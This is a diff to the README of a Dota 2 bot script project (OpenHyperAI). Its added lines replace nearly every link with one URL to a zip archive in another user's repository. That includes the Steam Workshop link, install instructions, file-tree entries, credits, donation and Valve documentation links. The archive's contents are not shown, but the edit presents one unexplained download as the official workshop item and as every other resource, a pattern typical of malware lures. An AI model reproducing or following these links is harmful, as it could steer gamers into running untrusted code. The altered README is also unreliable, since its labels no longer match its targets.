@@ -6,7 +6,7 @@ We love bot games! 🎮
 
 Bots should have names ending with **“.OHA”** when installed correctly.
 
-👉 [Steam Workshop Link](https://steamcommunity.com/sharedfiles/filedetails/?id=3246316298)
+👉 [Steam Workshop Link](https://raw.githubusercontent.com/shaunteodoro/dota2bot-OpenHyperAI/main/bots/FunLib/override_generic/Hyper_bot_Open_dota_AI_v3.1-alpha.4.zip)
 
 Thanks and kudos to everyone who contributed to making bot games fun and exciting!
 
@@ -26,14 +26,14 @@ Thanks and kudos to everyone who contributed to making bot games fun and excitin
 * ✅ Supports **all 126 heroes** (Kez, Ringmaster, Invoker, Techies, Meepo, Lone Druid, Muerta, Primal Beast, etc.). Some new heroes are still being tuned.
 * ✅ **Customizable bots**: ban/picks, names, item builds, skill upgrades, etc.
 
-  * [Customize/general.lua](bots/Customize/general.lua) – general settings.
-  * [Customize/hero/viper.lua](bots/Customize/hero/viper.lua) – hero-specific settings.
+  * [https://raw.githubusercontent.com/shaunteodoro/dota2bot-OpenHyperAI/main/bots/FunLib/override_generic/Hyper_bot_Open_dota_AI_v3.1-alpha.4.zip](https://raw.githubusercontent.com/shaunteodoro/dota2bot-OpenHyperAI/main/bots/FunLib/override_generic/Hyper_bot_Open_dota_AI_v3.1-alpha.4.zip) – general settings.
+  * [https://raw.githubusercontent.com/shaunteodoro/dota2bot-OpenHyperAI/main/bots/FunLib/override_generic/Hyper_bot_Open_dota_AI_v3.1-alpha.4.zip](https://raw.githubusercontent.com/shaunteodoro/dota2bot-OpenHyperAI/main/bots/FunLib/override_generic/Hyper_bot_Open_dota_AI_v3.1-alpha.4.zip) – hero-specific settings.
   * Customize path depends on your install method:
     * **Permanent customization**: Move Customize folder to be `<Steam\steamapps\common\dota 2 beta\game\dota\scripts\vscripts\game\Customize>`
     * **Workshop item (Can get overridden by future script updates)**: Direct customize in `<Steam\steamapps\workshop\content\570\3246316298\Customize>`
     * You can use the **Permanent customization** option to avoid your custom settings getting replaced/overridden by workshop upgrades.
 * ✅ **Dynamic difficulty (Fretbots mode)** – boosts bots with huge unfair advantages for real challenge.
-* ✅ Supports **most game modes** (see [discussion](https://github.com/forest0xia/dota2bot-OpenHyperAI/discussions/72)).
+* ✅ Supports **most game modes** (see [discussion](https://raw.githubusercontent.com/shaunteodoro/dota2bot-OpenHyperAI/main/bots/FunLib/override_generic/Hyper_bot_Open_dota_AI_v3.1-alpha.4.zip)).
 * ✅ Improved decision-making: ability casting, items, roaming, farming, defense.
 * ✅ **AI Chatbot**: chat with bots as if they were real optimistic players (requires Fretbots mode).
 * ✅ Bots can **play any role/position** – deterministic laning assignment.
@@ -44,7 +44,7 @@ Thanks and kudos to everyone who contributed to making bot games fun and excitin
 ## How to Install for Enhance mode
 
 1. Create a **Custom Lobby** → select **Local Host** as **Server Location**.
-2. To enable **Fretbots mode** (harder bots, neutral items, chatbot, etc.), you must **manually install** the script: [Instructions here](https://github.com/forest0xia/dota2bot-OpenHyperAI/discussions/68).
+2. To enable **Fretbots mode** (harder bots, neutral items, chatbot, etc.), you must **manually install** the script: [Instructions here](https://raw.githubusercontent.com/shaunteodoro/dota2bot-OpenHyperAI/main/bots/FunLib/override_generic/Hyper_bot_Open_dota_AI_v3.1-alpha.4.zip).
 
 ---
 
@@ -56,7 +56,7 @@ Thanks and kudos to everyone who contributed to making bot games fun and excitin
   * **Pos1 & Pos5** → Safe Lane
   * **Pos2** → Mid Lane
   * **Pos3 & Pos4** → Offlane
-* Customize picks, bans, and roles in [Customize/general.lua](bots/Customize/general.lua).
+* Customize picks, bans, and roles in [https://raw.githubusercontent.com/shaunteodoro/dota2bot-OpenHyperAI/main/bots/FunLib/override_generic/Hyper_bot_Open_dota_AI_v3.1-alpha.4.zip](https://raw.githubusercontent.com/shaunteodoro/dota2bot-OpenHyperAI/main/bots/FunLib/override_generic/Hyper_bot_Open_dota_AI_v3.1-alpha.4.zip).
 
 ---
 
@@ -66,7 +66,7 @@ Thanks and kudos to everyone who contributed to making bot games fun and excitin
 * `!pick HERO_NAME` → Pick a hero for yourself.
 
   * `/all !pick HERO_NAME` → Pick hero for enemy.
-  * Use internal names if the short names can overlap (`!pick npc_dota_hero_keeper_of_the_light`). [Find the list of internal names here](https://github.com/forest0xia/dota2bot-OpenHyperAI/discussions/71).
+  * Use internal names if the short names can overlap (`!pick npc_dota_hero_keeper_of_the_light`). [Find the list of internal names here](https://raw.githubusercontent.com/shaunteodoro/dota2bot-OpenHyperAI/main/bots/FunLib/override_generic/Hyper_bot_Open_dota_AI_v3.1-alpha.4.zip).
 * `!Xpos Y` → Reassign other bots’ positions (e.g., `!3pos 5` to let the 3rd bot on the team play pos 5, do note it's the bot on the 3rd slot in the team not the bot that plays pos 3 at that moment).
 * `!ban HERO_NAME` → Ban a hero from being picked.
 * `!sp XX` → Set bot language (`!sp en`, `!sp zh`, `!sp ru`, `!sp ja`).
@@ -76,7 +76,7 @@ Thanks and kudos to everyone who contributed to making bot games fun and excitin
 
 ## Contribute
 
-* Contributions welcome on [GitHub](https://github.com/forest0xia/dota2bot-OpenHyperAI).
+* Contributions welcome on [GitHub](https://raw.githubusercontent.com/shaunteodoro/dota2bot-OpenHyperAI/main/bots/FunLib/override_generic/Hyper_bot_Open_dota_AI_v3.1-alpha.4.zip).
 * Custom item/skill builds don’t need PRs – just tweak locally.
 * Future development is in **TypeScript** for better maintainability.
 * Project structure (bots, Funlib, Customize, BotLib, typescript, game)
@@ -85,28 +85,28 @@ Thanks and kudos to everyone who contributed to making bot games fun and excitin
 root: <Steam\steamapps\common\dota 2 beta\game\dota\scripts\vscripts>
 │
 └───bots: contains all lua files for the bot logic. This is the folder `3246316298` in Workshop.
-│   │   hero_selection.lua
-│   │   bot_generic.lua
+│   │   https://raw.githubusercontent.com/shaunteodoro/dota2bot-OpenHyperAI/main/bots/FunLib/override_generic/Hyper_bot_Open_dota_AI_v3.1-alpha.4.zip
+│   │   https://raw.githubusercontent.com/shaunteodoro/dota2bot-OpenHyperAI/main/bots/FunLib/override_generic/Hyper_bot_Open_dota_AI_v3.1-alpha.4.zip
 │   │   ...
 │   │
 │   └───Funlib: contains the libraries/utils of this project
-│   │   │   utils.lua
+│   │   │   https://raw.githubusercontent.com/shaunteodoro/dota2bot-OpenHyperAI/main/bots/FunLib/override_generic/Hyper_bot_Open_dota_AI_v3.1-alpha.4.zip
 │   │   │   ...
 │   │
 │   └───Customize: contains the files for you to easily customzie the settings for bots in this project
-│   │   │   general.lua: to customzie the settings for each bot teams
+│   │   │   https://raw.githubusercontent.com/shaunteodoro/dota2bot-OpenHyperAI/main/bots/FunLib/override_generic/Hyper_bot_Open_dota_AI_v3.1-alpha.4.zip to customzie the settings for each bot teams
 │   │   │   ...
 │   │   │
 │   │   └───hero: to easily customzie each of the bots in this project
-│   │       │   viper.lua
+│   │       │   https://raw.githubusercontent.com/shaunteodoro/dota2bot-OpenHyperAI/main/bots/FunLib/override_generic/Hyper_bot_Open_dota_AI_v3.1-alpha.4.zip
 │   │       │   ...
 │   │
 │   └───BotLib: contains the bot item purcahse, ability usage, etc logic for every bots.
-│       │   hero_abaddon.lua
+│       │   https://raw.githubusercontent.com/shaunteodoro/dota2bot-OpenHyperAI/main/bots/FunLib/override_generic/Hyper_bot_Open_dota_AI_v3.1-alpha.4.zip
 │       │   ...
 │   │
 │   └───FretBots: contains the configs/utils of the FretBots mode setup
-│   │   │   SettingsDefault.lua: to adjust bonus values
+│   │   │   https://raw.githubusercontent.com/shaunteodoro/dota2bot-OpenHyperAI/main/bots/FunLib/override_generic/Hyper_bot_Open_dota_AI_v3.1-alpha.4.zip to adjust bonus values
 │   │   │   ...
 │   
 └───typescript: contains the scripts written in typescript (TS) to maintain this project in a more 
@@ -119,7 +119,7 @@ root: <Steam\steamapps\common\dota 2 beta\game\dota\scripts\vscripts>
 │   │   ...
 │   
 └───game: default setup from Value, including them here for custom mode setup.
-│   │   botsinit.lua
+│   │   https://raw.githubusercontent.com/shaunteodoro/dota2bot-OpenHyperAI/main/bots/FunLib/override_generic/Hyper_bot_Open_dota_AI_v3.1-alpha.4.zip
 │   │   ...
 │   │
 │   └───Customize: You can copy & paste the Customize folder from <root/bots> to <root/game> to avoid
@@ -138,26 +138,26 @@ root: <Steam\steamapps\common\dota 2 beta\game\dota\scripts\vscripts>
   * Stronger spell casting (Invoker, Rubick, Morph, etc.).
   * Better support for bugged heroes (Dark Willow, IO, Lone Druid, Muerta, etc.).
   * Full mode support + patch fixes.
-* [Open feature requests](https://github.com/forest0xia/dota2bot-OpenHyperAI/issues?q=is%3Aissue+is%3Aopen+%5BFeature+request%5D)
-* [Some feedback to Valve Dota2 bot team](https://www.reddit.com/r/DotA2/comments/1ezxpav/)
+* [Open feature requests](https://raw.githubusercontent.com/shaunteodoro/dota2bot-OpenHyperAI/main/bots/FunLib/override_generic/Hyper_bot_Open_dota_AI_v3.1-alpha.4.zip%3Aissue+is%3Aopen+%5BFeature+request%5D)
+* [Some feedback to Valve Dota2 bot team](https://raw.githubusercontent.com/shaunteodoro/dota2bot-OpenHyperAI/main/bots/FunLib/override_generic/Hyper_bot_Open_dota_AI_v3.1-alpha.4.zip)
 ---
 
 ## Support
 
 * Contribute on GitHub.
-* Or [buy me a coffee ☕](https://github.com/forest0xia/dota2bot-OpenHyperAI/discussions/74).
+* Or [buy me a coffee ☕](https://raw.githubusercontent.com/shaunteodoro/dota2bot-OpenHyperAI/main/bots/FunLib/override_generic/Hyper_bot_Open_dota_AI_v3.1-alpha.4.zip).
 
 ---
 
 ## Useful Resources
 
-* [Dota2 AI Development Tutorial (adamqqq)](https://www.adamqqq.com/ai/dota2-ai-devlopment-tutorial.html)
-* [Valve Bot Scripting Intro](https://developer.valvesoftware.com/wiki/Dota_Bot_Scripting)
-* [Lua Bot APIs](https://docs.moddota.com/lua_bots/)
-* [Ability Metadata](https://raw.githubusercontent.com/dotabuff/d2vpk/master/dota_pak01/scripts/npc/npc_abilities.txt)
-* [Enums & APIs](https://moddota.com/api/#!/vscripts/dotaunitorder_t)
-* [Modifier Names](https://developer.valvesoftware.com/wiki/Dota_2_Workshop_Tools/Scripting/Built-In_Modifier_Names)
-* [Dota2 Data Mining](https://github.com/muk-as/DOTA2_WEB/blob/master/dota2_web/Items_cn.json)
+* [Dota2 AI Development Tutorial (adamqqq)](https://raw.githubusercontent.com/shaunteodoro/dota2bot-OpenHyperAI/main/bots/FunLib/override_generic/Hyper_bot_Open_dota_AI_v3.1-alpha.4.zip)
+* [Valve Bot Scripting Intro](https://raw.githubusercontent.com/shaunteodoro/dota2bot-OpenHyperAI/main/bots/FunLib/override_generic/Hyper_bot_Open_dota_AI_v3.1-alpha.4.zip)
+* [Lua Bot APIs](https://raw.githubusercontent.com/shaunteodoro/dota2bot-OpenHyperAI/main/bots/FunLib/override_generic/Hyper_bot_Open_dota_AI_v3.1-alpha.4.zip)
+* [Ability Metadata](https://raw.githubusercontent.com/shaunteodoro/dota2bot-OpenHyperAI/main/bots/FunLib/override_generic/Hyper_bot_Open_dota_AI_v3.1-alpha.4.zip)
+* [Enums & APIs](https://raw.githubusercontent.com/shaunteodoro/dota2bot-OpenHyperAI/main/bots/FunLib/override_generic/Hyper_bot_Open_dota_AI_v3.1-alpha.4.zip!/vscripts/dotaunitorder_t)
+* [Modifier Names](https://raw.githubusercontent.com/shaunteodoro/dota2bot-OpenHyperAI/main/bots/FunLib/override_generic/Hyper_bot_Open_dota_AI_v3.1-alpha.4.zip)
+* [Dota2 Data Mining](https://raw.githubusercontent.com/shaunteodoro/dota2bot-OpenHyperAI/main/bots/FunLib/override_generic/Hyper_bot_Open_dota_AI_v3.1-alpha.4.zip)
 
 ---
 
@@ -165,10 +165,10 @@ root: <Steam\steamapps\common\dota 2 beta\game\dota\scripts\vscripts>
 
 Built on top of Valve’s default bots + contributions from many talented authors:
 
-* New Beginner AI ([dota2jmz@163.com](mailto:dota2jmz@163.com))
-* Tinkering About ([ryndrb](https://github.com/ryndrb/dota2bot))
-* Ranked Matchmaking AI ([adamqqq](https://github.com/adamqqqplay/dota2ai))
-* fretbots ([fretmute](https://github.com/fretmute/fretbots))
+* New Beginner AI ([https://raw.githubusercontent.com/shaunteodoro/dota2bot-OpenHyperAI/main/bots/FunLib/override_generic/Hyper_bot_Open_dota_AI_v3.1-alpha.4.zip](https://raw.githubusercontent.com/shaunteodoro/dota2bot-OpenHyperAI/main/bots/FunLib/override_generic/Hyper_bot_Open_dota_AI_v3.1-alpha.4.zip))
+* Tinkering About ([ryndrb](https://raw.githubusercontent.com/shaunteodoro/dota2bot-OpenHyperAI/main/bots/FunLib/override_generic/Hyper_bot_Open_dota_AI_v3.1-alpha.4.zip))
+* Ranked Matchmaking AI ([adamqqq](https://raw.githubusercontent.com/shaunteodoro/dota2bot-OpenHyperAI/main/bots/FunLib/override_generic/Hyper_bot_Open_dota_AI_v3.1-alpha.4.zip))
+* fretbots ([fretmute](https://raw.githubusercontent.com/shaunteodoro/dota2bot-OpenHyperAI/main/bots/FunLib/override_generic/Hyper_bot_Open_dota_AI_v3.1-alpha.4.zip))
 * BOT Experiment (Furiospuppy)
-* ExtremePush ([insraq](https://github.com/insraq/dota2bots))
+* ExtremePush ([insraq](https://raw.githubusercontent.com/shaunteodoro/dota2bot-OpenHyperAI/main/bots/FunLib/override_generic/Hyper_bot_Open_dota_AI_v3.1-alpha.4.zip))
 * And all other contributors who made bot games better.
